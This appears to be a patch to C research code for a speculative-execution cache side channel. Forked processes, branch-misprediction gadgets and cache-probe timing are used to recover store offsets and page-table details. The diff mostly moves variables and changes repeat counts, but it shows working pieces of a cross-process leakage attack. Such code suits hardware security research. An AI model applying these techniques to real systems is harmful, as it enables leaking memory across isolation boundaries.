@@ -11,7 +11,6 @@
 
 static u32 threshold; // cache hit threshold
 static u8 *victim_page, *normal_page, *probe, *garbage; // some handy pages
-static volatile u64 size1 = 10, size2 = 11, size3 = 12; // slow branch gadgets
 
 static u8 *setup_page(size_t size, u8 init) {
     u8 *page = mmap(NULL, size, PROT_READ | PROT_WRITE,
@@ -54,16 +53,14 @@ static bool check_probe() {
 
 static int __attribute__((noinline)) store_offset_recovery() {
     int ret = 0;
-    u16 offset = 0x888;
     const u32 MEASURES = 100;
     const u32 page_size = getpagesize();
-    if (offset & (~0xff8)) {
-        fprintf(stderr, "invalide offset %#x.\n", offset);
-        return 1;
-    }
+    static volatile u64 _size1 = 10, _size2 = 11,
+                        _size3 = 12; // slow branch gadgets
 
     pid_t pid = fork();
     if (pid == 0) {
+        u16 offset = 0x888; // offset of the store
         while (true) {
             _mwrite(&normal_page[offset], 0xff);
         }
@@ -98,7 +95,7 @@ static int __attribute__((noinline)) store_offset_recovery() {
             // equivalent to tmp ? probe : garbage, but branchless
             u8 *arr = (u8 *)SEL_NOSPEC(tmp, probe, garbage);
             _lfence();
-            if ((tmp < size1) & (tmp < size2) & (tmp < size3)) {
+            if ((tmp < _size1) & (tmp < _size2) & (tmp < _size3)) {
                 // on misprediction, arr points to probe
                 // if *ptr is NOT stalled, we can observe signals from probe
                 _maccess(&arr[*ptr * page_size]);
@@ -121,7 +118,6 @@ mmap_fail:
 
 static int __attribute__((noinline)) load_page_recovery_throughput() {
     int ret;
-    u16 offset = 0x888;
     const u32 MEASURES = 100, REPEATS = 100000;
     const u32 page_size = getpagesize();
 
@@ -200,8 +196,7 @@ static int __attribute__((noinline)) load_page_recovery_throughput() {
 
 static int __attribute__((noinline)) load_page_recovery_contention() {
     int ret;
-    u16 offset = 0x888;
-    const u32 MEASURES = 50, REPEATS = 1000000;
+    const u32 MEASURES = 50, REPEATS = 100000;
     const u32 page_size = getpagesize();
 
     // a page with PL4_index = 0x87, PL3_index = 0x65,
